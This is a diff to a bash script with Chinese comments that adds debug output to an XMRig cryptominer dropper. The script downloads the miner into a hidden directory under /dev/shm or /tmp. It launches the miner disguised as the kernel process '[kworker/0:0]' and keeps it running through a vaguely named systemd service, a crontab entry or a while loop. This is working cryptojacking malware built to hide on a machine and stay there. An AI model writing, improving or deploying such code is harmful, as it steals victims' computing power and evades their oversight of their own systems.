@@ -4,6 +4,13 @@
 
 set -euo pipefail
 
+# 调试模式
+DEBUG=false
+if [ "${1:-}" = "debug" ]; then
+    DEBUG=true
+    set -x
+fi
+
 ### 配置区（修改这里） ###
 REPO_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
 BIN_NAME="xmrig"
@@ -13,21 +20,32 @@ THREADS="60"
 WORKER_NAME="worker"
 ####################################
 
+### 调试输出函数 ###
+debug_echo() {
+    if [ "$DEBUG" = true ]; then
+        echo "[DEBUG] $1"
+    fi
+}
+
 ### 初始化环境 ###
 init_env() {
+    debug_echo "开始初始化环境"
     # 创建内存文件系统
     if [ -d "/dev/shm" ]; then
         STORE_DIR="/dev/shm/.${BIN_NAME}_cache"
     else
         STORE_DIR="/tmp/.${BIN_NAME}_cache"
     fi
+    debug_echo "存储目录: $STORE_DIR"
     mkdir -p "$STORE_DIR"
     
     # 选择下载工具（优先用 curl）
     if command -v curl >/dev/null; then
         DOWNLOAD="curl -sSL"
+        debug_echo "使用 curl 下载"
     elif command -v wget >/dev/null; then
         DOWNLOAD="wget -qO-"
+        debug_echo "使用 wget 下载"
     else
         echo "[-] Error: 需要 curl 或 wget!" >&2
         exit 1
@@ -38,31 +56,52 @@ init_env() {
 deploy_bin() {
     if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
         echo "[*] 下载 ${BIN_NAME}..."
+        debug_echo "开始下载和解压过程"
+        
         # 创建临时目录
         TEMP_DIR="${STORE_DIR}/temp"
         mkdir -p "$TEMP_DIR"
+        debug_echo "创建临时目录: $TEMP_DIR"
         
-        # 下载并解压到临时目录
-        $DOWNLOAD "$REPO_URL" | tar -xz -C "$TEMP_DIR"
+        # 下载文件
+        debug_echo "下载URL: $REPO_URL"
+        $DOWNLOAD "$REPO_URL" > "${TEMP_DIR}/archive.tar.gz"
         if [ $? -ne 0 ]; then
-            echo "[-] 下载或解压失败"
+            echo "[-] 下载失败"
             rm -rf "$TEMP_DIR"
             exit 1
         fi
+        debug_echo "下载完成"
         
-        # 查找解压后的文件
+        # 解压文件
+        debug_echo "开始解压"
+        tar -xzf "${TEMP_DIR}/archive.tar.gz" -C "$TEMP_DIR"
+        if [ $? -ne 0 ]; then
+            echo "[-] 解压失败"
+            rm -rf "$TEMP_DIR"
+            exit 1
+        fi
+        debug_echo "解压完成"
+        
+        # 查找二进制文件
+        debug_echo "查找二进制文件"
         BIN_PATH=$(find "$TEMP_DIR" -name "xmrig" -type f | head -n 1)
         if [ -z "$BIN_PATH" ]; then
             echo "[-] 未找到二进制文件"
+            debug_echo "目录内容:"
+            ls -R "$TEMP_DIR"
             rm -rf "$TEMP_DIR"
             exit 1
         fi
+        debug_echo "找到二进制文件: $BIN_PATH"
         
-        # 移动文件到目标位置
+        # 移动文件
+        debug_echo "移动文件到: ${STORE_DIR}/${BIN_NAME}"
         mv "$BIN_PATH" "${STORE_DIR}/${BIN_NAME}"
         chmod +x "${STORE_DIR}/${BIN_NAME}"
         
-        # 清理临时目录
+        # 清理
+        debug_echo "清理临时文件"
         rm -rf "$TEMP_DIR"
         
         if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
@@ -75,18 +114,23 @@ deploy_bin() {
 
 ### 启动进程（伪装为系统进程） ###
 start_process() {
+    debug_echo "开始启动进程"
     if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
-        # 直接在后台启动，不等待
+        debug_echo "启动新进程"
         exec -a "[kworker/0:0]" "${STORE_DIR}/${BIN_NAME}" \
             -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
             -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
+    else
+        debug_echo "进程已在运行"
     fi
 }
 
 ### 持久化方式检测 ###
 setup_persistence() {
+    debug_echo "开始设置持久化"
     # 1. 尝试 Systemd（高权限）
     if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
+        debug_echo "使用 Systemd 持久化"
         cat <<EOF | sudo tee "/etc/systemd/system/${BIN_NAME}.service" >/dev/null
 [Unit]
 Description=Background Service
@@ -107,6 +151,7 @@ EOF
     
     # 2. 尝试 Cron（低权限）
     elif command -v crontab >/dev/null; then
+        debug_echo "使用 Cron 持久化"
         # 创建内存中的启动命令
         STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
         # 添加到 crontab
@@ -116,6 +161,7 @@ EOF
     
     # 3. 回退到 while 循环（最低权限）
     else
+        debug_echo "使用 While 循环监控"
         # 直接在内存中创建监控函数
         monitor_func() {
             while true; do
@@ -133,6 +179,7 @@ EOF
 
 ### 检查进程状态 ###
 check_status() {
+    debug_echo "检查进程状态"
     # 检查主进程
     if pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
         echo "[+] 主进程运行中"
